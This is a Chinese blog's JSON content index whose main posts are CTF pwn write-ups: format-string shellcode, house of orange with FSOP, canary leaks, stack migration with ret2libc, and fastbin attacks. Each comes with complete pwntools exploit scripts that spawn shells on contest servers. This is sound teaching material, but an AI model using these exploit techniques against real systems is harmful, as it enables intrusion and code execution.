{"meta":{"title":"Darkness_Sword","subtitle":"站点副标题","description":"站点描述","author":"暮夜","url":"https://12yhy3.github.io","root":"/"},"pages":[{"title":"个人简介","date":"2024-11-25T01:29:22.000Z","updated":"2024-12-02T00:52:10.723Z","comments":false,"path":"about/index.html","permalink":"https://12yhy3.github.io/about/index.html","excerpt":"","text":"网站构建中…..博文图片暂时无法显示"},{"title":"我的歌单","date":"2024-11-25T13:22:49.000Z","updated":"2024-11-28T09:28:05.645Z","comments":false,"path":"playlist/index.html","permalink":"https://12yhy3.github.io/playlist/index.html","excerpt":"","text":""}],"posts":[{"title":"2024金盾信安杯_PWN","slug":"2024-jdxa","date":"2024-12-02T00:42:00.000Z","updated":"2024-12-02T03:08:27.317Z","comments":true,"path":"2024/12/02/2024-jdxa/","permalink":"https://12yhy3.github.io/2024/12/02/2024-jdxa/","excerpt":"","text":"20222023sign-format 题源：sign-format 考点：shellcode（&#x2F;orw）+ bss段format_string + 篡改**exit() 执行时的 dlfiini** 源码关闭了输出流，存在非栈上格式化字符串漏洞。 写入地址具有可执行权限。 分析**思路**：在bss段布置shellcode，劫持程序执行流转到输入地址。 **具体：在bss段布置来实现执行shellcode（orw）的跳板，之后修改dlfini的rsi偏移来指向orw执行的地址**即可，后续程序执行到 exit() 退出时候会读出flag。 exp1234567891011121314151617from pwn import *elf = ELF(&#x27;./pwn&#x27;)context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)r=process(&#x27;./pwn&#x27;)s= shellcraft.open(&quot;./flag&quot;,0)s+= shellcraft.read(1,0x4040b0 + 0x100,0x100)s+= shellcraft.write(2,0x4040b0 + 0x100,0x100)#------------------------不懂-----------------------------p = b&quot;%776c%30$hn&quot; # 776 = 0x308p = p.ljust(0x40,b&#x27;\\x00&#x27;)p += p64(0x4040b8)p += b&quot;\\x90&quot;*0x10#-----------------------------------------------------p += asm(s)print(len(p))r.sendafter(b&quot;Let&#x27;s start!\\n&quot;,p)r.interactive() 2024⭐orange 考点： house of orange &amp;&amp; FSOP 注意点：libc_2.23 ，本地调试看不到预期结果【最好使用 Ubuntu16.04 尝试，否则看不了结构体….】 源码分析附件源码发现没有dele功能，并且根据题目不难猜到考察house of orange打法。查看edit功能发现输入字节数可控，并且没有对size进行检验，存在溢出漏洞。 满足 house_of_orange 的条件：堆溢出能修改 topchunk size ；申请 size 限制范围大；没有 free 功能。当topchunk 不能满足申请分配的大小时，topchunk 被释放进 unsortedbin ，可以实现没有 free 函数释放堆块。 分析思路：首先任意申请一个堆块，然后对它进行edit,利用堆溢出漏洞篡改topchunk的size值，将其改为一个较小的数。并且new_topchunk_size + chunk_0_size需要满足页对齐，即size总和为0x1000的倍数，这样就能绕过堆空间扩展时的检验。 接着申请一个大堆块满足chunk_1_size &gt; top_chunk_size，这样top_chunk就会被放到unsortedbin中，实现无free释放堆块。然后申请一个largebin范围的堆块，使得unsortedbin中的old_topchunk被分割，剩余部分进入largebins。并且堆块内部有残留的heap_addr和main_arena地址信息，进而show可以泄露得到libc_base和heap_addr，然后利用相对偏移计算得到_IO_list_all地址和system函数地址。 最后借助unsortedbin_attack劫持_IO_list_all达成FSOP利用。可以将_IO_list_all写值为main_arean+88显然，main_arena+88处的内容不是我们可以自由控制的，现在，假设我们将main_arena+88处看成是一个 IO_FILE结构体，那么struct_IO_FILE *_chain;指针的地址为:main_arena+88+0x68 = main_arena + 0xC0而main_arena + 0xC0存储着的是0x60大小的small bin第一个chunk的地址，所以我们要让我们伪造的堆块加入到 0x60的 small bin 中即可完成调用。而glibc并没有对堆块做太多的检测，只比较的 size，因此可以直接利用上述堆溢出修改size。然后伪造_IO_list_all结构，覆盖其overflow指针为目标函数，覆盖_IO_list_all指针为可控地址，最后触发程序错误或退出程序即可得到shell。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657from pwn import *def ini(name,os,arch): elf = ELF(name) context(log_level = &#x27;debug&#x27;,os = os,arch = arch)#io = process(&#x27;./Orange&#x27;)io = remote(&#x27;114.55.67.167&#x27;,&#x27;53544&#x27;)def add(size,data): io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(1)) io.sendafter(b&#x27;\\n&#x27;,str(size)) io.sendafter(b&#x27;\\n&#x27;,data)def edit(index,size,data): io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(2)) io.sendafter(b&#x27;\\n&#x27;,str(index)) io.sendafter(b&#x27;\\n&#x27;,str(size)) io.sendafter(b&#x27;\\n&#x27;,data)def show(index): io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(3)) io.sendafter(b&#x27;\\n&#x27;,str(index))ini(&#x27;./Orange&#x27;,&#x27;linux&#x27;,&#x27;amd64&#x27;)#gdb.attach(io)#pause()add(0x18,b&#x27;a&#x27;*0x18)edit(0,0x28,b&#x27;A&#x27;*0x18+p64(0xfe1)) # 这里需要页对齐，0xfe0+0x20 = 0x1000add(0x1000,b&#x27;B&#x27;*0x8)add(0x400,b&#x27;C&#x27;*0x8)libc = ELF(&#x27;./libc-2.23.so&#x27;)show(2)io.recvuntil(b&#x27;C&#x27;*8)leak = u64(io.recv(6).ljust(8,b&#x27;\\x00&#x27;))print(&quot;leak==&gt;&quot;,hex(leak))_IO_list_all = leak+0x8+0x390print(&quot;_IO_list_all==&gt;&quot;,hex(_IO_list_all))libc_base = leak-0x3c5188print(&quot;libc_base==&gt;&quot;,hex(libc_base))edit(2,0x10,b&#x27;C&#x27;*0x10)show(2)io.recvuntil(b&#x27;C&#x27;*16)heap_leak = u64(io.recvline(keepends=False).ljust(8,b&#x27;\\x00&#x27;)) - 0x20print(&quot;heap_leak==&gt;&quot;,hex(heap_leak))target = elf.sym[&#x27;system&#x27;]target = libc_base+libc.sym[&#x27;system&#x27;]payload=b&#x27;f&#x27;*0x400payload1=b&#x27;/bin/sh\\x00&#x27;+p64(0x61) #old top chunk prev_size &amp; size 同时也是fake file的_flags字段payload1+=p64(0)+p64(_IO_list_all-0x10) #old top chunk fd &amp; bkpayload1+=p64(0)+p64(1) #_IO_write_base &amp; _IO_write_ptrpayload1 = payload1.ljust(0xc0,b&#x27;\\x00&#x27;)payload1 += p64(0)*3payload1+=p64(heap_leak+0x508) #作为vtable_start_addr# 即该填充数据所在地址payload1+=p64(0)+p64(0)+p64(target) #DUMMY finish overflowpayload += payload1edit(2,0x820,payload)io.sendafter(b&#x27;&gt;&gt;\\n&#x27;,str(1))io.interactive()#flag&#123;7452803d-f868de57-9651234-2e000b1e&#125; 参考house of orange House of orange-安全客 - 安全资讯平台 堆利用详解：the house of orange-Pwn-看雪-安全社区|安全招聘|kanxue.com green 32 位 fmt + 构造函数执行流 源码分析源码发现存在gets栈溢出漏洞，并且由于printf函数直接以s作为参数导致格式化字符串漏洞，可以泄露程序基地址和canary值。 分析首先利用第一个gets和printf泄露canary地址和程序基地址，然后加上偏移即可得到程序代码真实地址。由于存在栈溢出，并且发现flag输出函数： 因此只需要控制程序执行流**依次给check1，check2，check3，finalcheck函数传递指定参数满足要求即可。Finalcheck函数放在最后执行即可获取shell。由于main函数地址已知，32位程序使用栈传递参数，而且执行流过长不易一次执行，因此依次跳转到main函数作为缓冲**，一一赋值即可。 运行结果如下： exp123456789101112131415161718192021222324252627282930313233343536373839404142434445from pwn import *from LibcSearcher import *context(arch=&#x27;amd64&#x27;, os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)#io = process(&#x27;./green&#x27;)io = remote(&#x27;114.55.67.167&#x27;,50564)p = ioelf = ELF(&#x27;./green&#x27;)#gdb.attach(io)#pause()offset = 0x4*8 payload = b&#x27;%3$p-%15$p&#x27; # base_addr+0x2f1 , canary_addrp.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,payload)base = int(p.recv(10),16) - 0x2f1io.recvuntil(b&#x27;-&#x27;)canary = int(io.recvline(keepends=False),16)print(&quot;canary==&gt;&quot;,hex(canary))print(&quot;base===&gt;&quot;,hex(base))func = 0x342 + basecheck1 = 0x20d + basecheck2 = 0x226 + basecheck3 = 0x23f + baseflag = 0x258 + baseebx = 0x1022 + basemain = base + 0x365payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(check1) + p32(main) + p32(0x1337) p.sendline(payload)payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(check2) + p32(main) + p32(0x420) p.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,b&#x27;a&#x27;)io.recvline()p.sendline(payload)payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(check3) + p32(main) + p32(0xDEADBEEF) p.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,b&#x27;a&#x27;)io.recvline()p.sendline(payload)payload = b&#x27;a&#x27;*offset + p32(canary) + p32(0)*3 + p32(flag) + p32(main) + p32(0x123) p.sendlineafter(b&#x27;Every protection is enabled. Good luck.\\n&#x27;,b&#x27;a&#x27;)io.recvline()p.sendline(payload)io.interactive()# flag&#123;c6f3396244adadd3c53c49cf13ca864e&#125; stackmigration 64 位栈迁移，栈地址可知 源码 分析分析程序发现给出了输入点的栈地址，并且存在栈溢出，不过溢出长度有限，需要使用栈劫持，即直接在输入缓冲区布置payload，在程序返回点填充main函数地址以便ret2libc返回再次执行，然后利用leave将rip重新劫持到输入起始位置执行payload进行泄露函数真实地址。进而得到system函数和字符串“&#x2F;bin&#x2F;sh”真实地址。 接着，由于返回地址被修改为main_addr，因此会再次执行回到vul函数，这时候布置payload，由于leave指令的作用，后续会直接让程序转向执行system（&#x2F;bin&#x2F;sh）即可获得shell。 exp12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)from LibcSearcher import *#io = process(&#x27;./stack_migration&#x27;)io = remote(&#x27;114.55.67.167&#x27;,&#x27;54668&#x27;)elf = ELF(&#x27;./stack_migration&#x27;)puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main = elf.sym[&#x27;main&#x27;]ret = 0x000000000040065eleave = 0x0000000000400896pop_rdi = 0x0000000000400963offset = 0x20#gdb.attach(io)#pause()io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(hex(stack))p1 = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)p1 += p64(stack-0x8) + p64(leave)io.sendafter(b&#x27;Do you still have something to say?\\n&#x27;,p1)puts = u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(&quot;puts===&gt;&quot;,hex(puts))libc = ELF(&#x27;./libc-2.23.so&#x27;)libc_base = puts-libc.sym[&#x27;puts&#x27;]sys = libc_base + libc.sym[&quot;system&quot;]bin = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(&quot;stack===&gt;&quot;,hex(stack))p2 = (p64(pop_rdi) + p64(bin) + p64(sys)).ljust(offset,b&#x27;\\x00&#x27;)p2 += p64(stack-0x8) +p64(leave)io.sendafter(b&#x27;Do you still have something to say?\\n&#x27;,p2)io.interactive()# flag&#123;9bfc04fc-f4dd8d28-77a0b2b6-24867e58&#125; *babyheap源码 分析分析源码发现程序实现了增删改查四种功能，并且最多申请16个chunk，每个chunk大小不超过0x510。由于程序依赖libc版本为2.23，因此考虑使用unsortedbin attack，fastbin atack。 首先申请几个堆块，其中一个小chunk被两个大chunk夹着，然后通过释放前一个chunk，伪造后一个chunk的pre_size和pre_use标志位，然后再释放，绕过检测机制使得这三个chunk均被放入unsortedbin，利用show(1)泄露libc基地址，进而得到malloc_hook和realloc地址。利用fastbin_attack劫持fd指针，申请得到malloc_hook上方堆块，通过修改该堆块内容，将malloc_hook篡改为one_gadget。最后触发malloc_hook即可成功shell。 运行结果： exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899from pwn import *import timelocal_file = &#x27;./babyheap&#x27;elf = ELF(local_file)libc=ELF(&#x27;./libc-2.23.so&#x27;)context.log_level = &#x27;debug&#x27;context.arch = elf.archs = lambda data :io.send(data)sa = lambda delim,data :io.sendafter(delim, data)sl = lambda data :io.sendline(data)sla = lambda delim,data :io.sendlineafter(delim, data)r = lambda numb=4096 :io.recv(numb)ru = lambda delims, drop=True :io.recvuntil(delims, drop)uu32 = lambda data :u32(data.ljust(4, b&#x27;\\x00&#x27;))uu64 = lambda data :u64(data.ljust(8, b&#x27;\\x00&#x27;))get_q = lambda data: (~np.uint64(data) + 1)get_d = lambda data: (~np.uint32(data) + 1)def get_sh() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\\x00&#x27;))info_addr = lambda tag, addr :io.info(tag + &#x27;==&gt;&#x27; +&#x27;: &#123;:#x&#125;&#x27;.format(addr))itr = lambda :io.interactive()io = remote(&#x27;121.41.16.43&#x27;,50604)#io = process(&#x27;./babyheap&#x27;)def men(i): ru(&#x27;&gt;&gt;&#x27;) sl(str(i))def add(size,content): men(1) ru(&#x27;want&#x27;) sl(str(size)) ru(&#x27;something&#x27;) sl(content)def edit(i,content): men(2) ru(&#x27;index&#x27;) sl(str(i)) ru(&#x27;something&#x27;) s(content)def show(i): men(3) ru(&#x27;index&#x27;) sl(str(i))def free(i): men(4) ru(&#x27;index&#x27;) sl(str(i))#gdb.attach(io)add(0x200,&#x27;a&#x27;*0x80)add(0x18,&#x27;a&#x27;*0x18)add(0x1f0,&#x27;a&#x27;*0x80)add(0x200,b’aaaa’)list1=0x6020C0free(0)edit(1,b&#x27;a&#x27;*0x10+p64(0x230))#pause()free(2)#pause()# chunk_1未被dele但是被consolidate合并入unsortedbins,old_chunk_2的 pre_size = old_chunk_0 + old_chunk_1，且size的pre_use置为了零add(0x200,&#x27;a&#x27;*0x80) # chunk_0#pause()show(1) # chunk_1未被dele但是被consolidate合并入unsortedbins,用于泄露libcru(&#x27;see see\\n&#x27;)libc_base=uu64(r(6))-0x3c4b78print(hex(libc_base))add(0x60,b&#x27;a&#x27;) #chunk_2#pause()free_hook=libc_base+0x3c67a8malloc=libc_base+libc.sym[&#x27;__malloc_hook&#x27;]free(2)# chunk_2放入fastbins#pause()edit(1,p64(malloc-0x20-3)*2+b&#x27;\\n&#x27;)#pause()# fastbin--&gt;fd_hijacksys=libc_base+libc.sym[&#x27;system&#x27;]onegadget=[0x4527a,0xf03a4,0xf1247]realloc=libc_base+libc.sym[&#x27;realloc&#x27;]add(0x60,p64(sys))#pause()add(0x60,b&#x27;aaa&#x27;+p64(0)+p64(onegadget[0]+libc_base)+p64(realloc+0x8))#pause()io.interactive()# flag&#123;7421793d-f868de57-90556d34-2e000b1e&#125;","categories":[],"tags":[{"name":"<span class=\"label label-primary\">PWN</span>","slug":"span-class-label-label-primary-PWN-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-primary-PWN-span/"}]},{"title":"Stack_migrantion","slug":"Stack_migrantion","date":"2024-11-28T08:11:44.000Z","updated":"2024-11-28T08:18:06.297Z","comments":true,"path":"2024/11/28/Stack_migrantion/","permalink":"https://12yhy3.github.io/2024/11/28/Stack_migrantion/","excerpt":"","text":"一. 漏洞原理 二. 漏洞利用 任意地址写 > 情况1：存在**多次输入**和后门，并且第一次能够溢出，程序会对内存中 password 进行判断，如果通过则有利。 > 第一次溢出覆盖栈底 rbp &#x2F; ebp，修改为 password 存放地址附近（例如需要对 password 修改，第二次输入位置在 rbp &#x2F; ebp - 4 ，则 fake_rbp &#x2F; ebp 为 address[password] + 4 ），根据第二次输入选择合适地址能够覆盖该值。 i386+ret2libc3 > size( buffer ) = 0x2c，read（0，&(rbp-0x2c)，0x34) 【溢出覆盖 ebp , ebp+0x4】 > > 注意点：read 代码段末尾自带 leave ; ret > > leave = mov ebp , esp + pop ebp [ 随后 esp+0x4] > > ret = pop rsp [ 随后 esp+0x4] > payload 结构图 | payload_1 | payload2 | payload3 | | --- | --- | --- | | buf_start aaaa | bss+0x800[利用后面的 leave ; ret 为payload3准备ebp】 | aaaa | | ... | puts_plt | system | | ... | read【puts 调用后返回地址】 | 0 | | ... | puts_got 【puts 参数】 | /bin/sh | | buf_end aaaa | aaaa...... | aaaa...... | | ebp bss+0x2c | bss | bss+0x800-0x2c | | \"eip\" leave ; ret | leave ; ret | leave | exp 123456789101112131415161718192021222324252627282930offset = 0x2cbss = 0x804c000-0x900puts_plt = 0x8048510 #elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]ebp = 0x804897bread = 0x08048829leave = 0x08048605payload1 = b&#x27;a&#x27;*offset + p32(bss+0x2c) + p32(read)io.send(payload1)p2 = p32(bss+0x800) + p32(puts_plt) + p32(read) + p32(puts_got) payload2 = p2.ljust(offset,b&#x27;\\x00&#x27;) + p32(bss) + p32(leave)io.send(payload2)puts = u32(r.recvuntil(b&#x27;\\xf7&#x27;)[-4:])print(hex(puts))libc = LibcSearcher(&quot;puts&quot;,puts)libc_base = puts - libc.dump(&quot;puts&quot;)print(hex(libc_base))sym = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)p3 =b&#x27;a&#x27;*4 + p32(sym) + p32(0) + p32(binsh_addr)payload3 =p3.ljust(offset, b&#x27;\\x00&#x27;) +p32(bss +0x800 -0x2c) +p32(leave)r.send(payload3)r.interactive() 三. 例题 溢出4/8字节 栈地址可知 栈地址未知 溢出8/16字节 栈地址可知 > 如果可以获取输入地点的栈地址，或者bss段/堆空间 找不到合适空间，并且输入点长度足够构造ROP链，可以直接在输入点进行二次栈迁移。 > 通常可以获取栈地址的方法： 程序直接给出。 通过printf，puts 等函数泄露。（注意：**printf函数通过%s泄露的是 某地址 存储的 数据而不是实际地址，**puts函数与之效果相同）（可参见例题2，ebp-0x40而不是ebp-0x30）。 stack migration > 题源：BUUCTF-PWN（[NewStarCTF 2023 公开赛道]） > 方法1：栈迁移+ret2libc3 源码 ![](Stack_migration/1.png) ![](./test/image.png) 栈帧结构 payload'2'为参考exp构造，[详见](https://blog.csdn.net/Xzzzz911/article/details/133842017)。官方wp同payload2。 payload 1 payload 2 payload ‘2’ aaaaaaaa buf 1**** :::color5 &lt;—-stack—&gt;::: buf 1 aaaaaaaa aaaaaaaa aaaaaaaa buf 2 buf 2 pop rdi；ret bbbbbbbb pop rdi；ret bin ** ret** got sys pop rdi；ret plt aaaaaaaa bin main aaaaaaaa sys aaa…… aaa……. aaa…… ** fake_rbp** （stack） :::color5 &lt;——-rbp—&gt;::: ** **** stack** ** stack+8** ** leave；ret** ** leave；ret** ** leave；ret** 栈迁移运行流程 > 与本题不太一样，payload1中buf2处填充8字节数据平衡栈帧，否则接收不到再次进入main时候的栈地址。 > 一. 栈迁移调用 puts函数 泄露puts真实地址 二. 返回到main函数后第二次栈迁移获取shell （1）函数内部结尾的 **leave结束后**栈结构： stack aaaaaaaa buf 1 aaaaaaaa &lt;—rbp pop rdi；ret buf 2 pop rdi；ret bin bin sys sys aaaaaaaa aaaaaaaa aaaaaaaa aaaaaaaa aaa……. aaa……. rbp,rsp–&gt; ** **** stack** ** **** stack** ** leave；ret** ** leave；ret** &lt;—rsp ret结束后， rip 指向 ** leave；ret **地址，rsp比原来向下移动 4&#x2F;8字节。 （2）**rip执行leave后**： 此时rbp内部完全是数据（aaaaaaaa） payload 2 buf 1 aaaaaaaa buf 2 pop rdi；ret &lt;—rsp bin sys aaaaaaaa aaaaaaaa aaa……. ** **** stack** ** leave；ret** **rip执行ret之后**： rsp—&gt;&#x2F;bin&#x2F;sh rip—-&gt;pop rdi；ret （3）**rip执行pop rdi后：** rdi—&gt;&#x2F;bin&#x2F;sh rsp—&gt;system rip—&gt;ret rip执行ret指令： rip—&gt;system（system_plt） rsp—&gt;aaaaaa 接着会调用system函数，同时rdi的数据&#x2F;bin&#x2F;sh成为参数，执行了shell。 exp示例 12345678910111213141516171819202122232425262728293031323334353637383940414243from pwn import *context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)from LibcSearcher import *#io = process(&#x27;./pwn2&#x27;)io = remote(&#x27;node5.buuoj.cn&#x27;,28894)elf = ELF(&#x27;./pwn2&#x27;)puts_got = elf.got[&#x27;puts&#x27;]puts_plt = elf.plt[&#x27;puts&#x27;]main = 0x4012acret = 0x40101aleave = 0x4012aapop_rdi = 0x401333offset = 0x50io.sendafter(b&#x27;name:\\n&#x27;,b&#x27;aaaaaaaa&#x27;) #p64(pop_rdi)io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(hex(stack))#=堆栈平衡，令ROP向下挪移8字节（p64(0)，stack+8），否则第二次接受不到栈地址0x...=#泄漏stack为第一个buf地址（第一次读入八字节的地址）p1 = (p64(0)+ p64(pop_rdi) + p64(puts_got) + p64(puts_plt) +p64(main)).ljust(offset,b&#x27;a&#x27;) p1 += p64(stack+8) + p64(leave)#======================================================================io.sendafter(b&#x27;plz:\\n&#x27;,p1)io.recvuntil(b&quot;maybe I&#x27;ll see you soon!\\n&quot;)puts =u64(io.recvuntil(b&#x27;\\x7f&#x27;)[:6].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts))libc = LibcSearcher(&#x27;puts&#x27;,puts)libc_base = puts-libc.dump(&#x27;puts&#x27;)sys = libc_base + libc.dump(&#x27;system&#x27;)bin = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)io.sendafter(b&#x27;name:\\n&#x27;,b&#x27;a&#x27;*8)io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)#===============此处直接填充亦可==========================p2 = (p64(pop_rdi) + p64(bin) + p64(sys)).ljust(offset,b&#x27;\\x00&#x27;)p2 += p64(stack) +p64(leave)#========================================================io.sendafter(b&#x27;plz:\\n&#x27;,p2)io.interactive() 方法2：leak_libc_base+栈迁移 主要思路：由于printf以%s打印数据时候遇到 b’\\x00’ 才会停止。输入满8字节，利用printf函数可以直接打印出函数 _IO_file_jumps 地址，利用给出的 libc程序进而获取 libc_base 地址， 然后直接得到system和&#x2F;bin&#x2F;sh地址，只进行一次栈迁移（payload2）即可获取shell。 tips：有个疑点，如下图。kali与Xubuntu下gdb调试的栈帧结构出现了不一致…… kali下_IO_file_jumps函数在打印地址上方，但实际上应该在下面。所以才会带出_IO_file_jumps函数地址。 Xubuntu下gdb调试结构：（与靶机实际栈结构一致） exp如下： 1234567891011121314151617181920212223242526272829from pwn import *context(os = &#x27;linux&#x27;,arch = &#x27;amd64&#x27;,log_level = &#x27;debug&#x27;)from LibcSearcher import *io = remote(&#x27;node5.buuoj.cn&#x27;,27066)main = 0x4012acret = 0x40101aleave = 0x4012aapop_rdi = 0x401333offset = 0x50# 第一次发送数据利用printf函数泄露一个函数地址io.sendafter(b&#x27;name:\\n&#x27;,b&#x27;aaaaaaaa&#x27;) _IO_file_jumps =u64(io.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(_IO_file_jumps))# 获得栈地址io.recvuntil(b&#x27;0x&#x27;)stack = int((io.recv(12).ljust(8,b&#x27;\\x00&#x27;)),16)print(hex(stack))libc = LibcSearcher(&#x27;_IO_file_jumps&#x27;,_IO_file_jumps)libc_base = _IO_file_jumps-libc.dump(&#x27;_IO_file_jumps&#x27;)sys = libc_base + libc.dump(&#x27;system&#x27;)bin = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)p2 = (p64(pop_rdi) + p64(bin) + p64(sys)).ljust(offset,b&#x27;\\x00&#x27;)p2 += p64(stack) +p64(leave)io.sendafter(b&#x27;plz:\\n&#x27;,p2)io.interactive() 八字节能干什么 > 题源：PolarD&N-PWN > 源码 首先有两次输入机会，并且 ebp 和 ebp+4 可以控制。给出了system('ls')；可以调用system函数。 分析 第一次输入填充垃圾数据，利用printf函数泄露 ebp 的内容，然后 减去 偏移得到栈地址。 第二次构造ROP链，利用read向栈读入 &#x2F;bin&#x2F;sh\\x00 参数 构造 system(‘&#x2F;bin&#x2F;sh’)后面函数。ebp填充栈地址，然后填充leave；ret 进行栈迁移，使得程序再次从栈地址运行，获取shell。 exp： 123456789101112131415161718192021from pwn import *context(arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;,log_level = &#x27;debug&#x27;)io = remote(&#x27;120.46.59.242&#x27;,2109)#io = process(&#x27;./1&#x27;)elf = ELF(&#x27;./1&#x27;)io.send(b&#x27;a&#x27;*0x30)io.recvuntil(b&#x27;a&#x27;*0x30)ebp_addr = u32(io.recv(4))stack = ebp_addr-0x40print(hex(stack))leave = 0x8048488sys = elf.sym[&#x27;system&#x27;]p1 = (b&#x27;aaaa&#x27; + p32(sys) + p32(1) + p32(stack+0x10) + b&#x27;/bin/sh&#x27; ).ljust(0x30,b&#x27;\\x00&#x27;) #注意\\x00防止截断，否则出错。并且stack处不能填充b&#x27;/bin/sh&#x27;p1 += p32(stack) + p32(leave)io.send(p1)io.interactive() 栈地址未知 > 此时将栈迁移到bss段，或者需要利用read进行任意地址写。 > > 与栈地址可知最大的区别： > > **通常第一次payload 的rip/eip填充的都是主函数代码复用read等片段**，此时需要注意**第二次payload填充时候是从fake_rbp-buf 地址开始写入，并且溢出字节依然有限**，通常需要多次payload和使用leave地址。 > stack migration revenge > 题源：BUUCTF-PWN（ [NewStarCTF 2023 公开赛道] ) > 源码 反汇编得到主要功能函数代码 查看汇编代码获取调用read函数的代码段地址，便于后续利用read写入数据，同时减少了调用read_plt需要传参的问题。 查看可写代码段bss地址，选用大于0x404070并且小于0x405000的位置布置rop。 构造rop链 exp： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;r = remote(&#x27;node5.buuoj.cn&#x27;,26923)elf = ELF(&#x27;./pwn&#x27;)offset = 0x50bss = 0x405000-0x900read = 0x4011ffputs_plt = elf.plt[&#x27;puts&#x27;]puts_got = elf.got[&#x27;puts&#x27;]pop_rbp = 0x40115dleave = 0x401227pop_rdi = 0x4012b3ret = 0x40101apayload = b&#x27;a&#x27;*offset + p64(bss+0x50) + p64(read)r.sendafter(b&#x27;just chat with me:\\n&#x27;,payload)# 第二次payload会调用read从rbp-0x50即 bss地址开始写入p2 = b&#x27;a&#x27;*8 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt)p2 += p64(pop_rbp) + p64(bss+0x800) + p64(read)p2 = p2.ljust(offset,b&#x27;\\x00&#x27;) + p64(bss) + p64(leave)r.sendafter(b&#x27;so funny\\n&#x27;,p2) # p64(bss) + p64(leave) :将rbp转到bss地址，此时栈结构：# rbp aaaaaaaa# rip p64(pop_rdi) + p64(puts_got) + p64(puts_plt) -----leak_addr# rip-&gt;rip p64(pop_rbp) + p64(bss+0x800) + p64(read)# 栈迁移第二个输入点，用于向 bss+0x750地址 填充system(/bin/sh)r.recvuntil(b&#x27;so funny\\n&#x27;)puts =u64(r.recvuntil(b&#x27;\\x7f&#x27;)[-6:].ljust(8,b&#x27;\\x00&#x27;))print(hex(puts))libc = LibcSearcher(&quot;puts&quot;,puts)libc_base = puts - libc.dump(&quot;puts&quot;)print(hex(libc_base))system_addr = libc_base + libc.dump(&quot;system&quot;)binsh_addr = libc_base + libc.dump(&quot;str_bin_sh&quot;)payload =p64(pop_rdi) +p64(binsh_addr) +p64(system_addr)payload =payload.ljust(0x50, b&#x27;\\x00&#x27;) +p64(bss +0x800 -0x58) +p64(leave)# 再次调转执行，从 bss+0x748开始，由于该地址为无关数据，有效地址从bss+0x750开始，因此 执行system(/bin/sh)r.send(payload)r.interactive() pwn271 参见 pwn 入门 wp，结合上面漏洞利用 32 位程序。","categories":[],"tags":[{"name":"<span class=\"label label-primary\">PWN</span>","slug":"span-class-label-label-primary-PWN-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-primary-PWN-span/"}]},{"title":"test","slug":"test","date":"2024-11-25T02:00:00.000Z","updated":"2024-12-02T03:09:47.260Z","comments":true,"path":"2024/11/25/test/","permalink":"https://12yhy3.github.io/2024/11/25/test/","excerpt":"","text":"以下是文章内容 iframe插件 Git Bash构建并推送更新到github&#x2F;本地12hexo c &amp;&amp; hexo g &amp;&amp; hexo d或 hexo g -d 启动本地服务1hexo s(erver) 清除缓存 修改文章后需要清除缓存，然后进行构建和推送 1hexo clean 参考fluid示例bloghexo命令行发布文章1hexo new test # 创建新文章test,同时会创建/post/test文件夹用于存放使用的图片等资源 图片显示问题123在博客根目录source文件下新建images文件夹，用于存放博客插入的图片 ，然后在文章中插入图片即可格式为 ![图片名称](/images/xxx.png)路径：/source/img 用来存放博客背景等图片 如参考 其他小问题121. 开启代理查看博客时候显示会有点问题...","categories":[],"tags":[{"name":"<span class=\"label label-info\">others</span>","slug":"span-class-label-label-info-others-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-info-others-span/"}]}],"categories":[],"tags":[{"name":"<span class=\"label label-primary\">PWN</span>","slug":"span-class-label-label-primary-PWN-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-primary-PWN-span/"},{"name":"<span class=\"label label-info\">others</span>","slug":"span-class-label-label-info-others-span","permalink":"https://12yhy3.github.io/tags/span-class-label-label-info-others-span/"}]}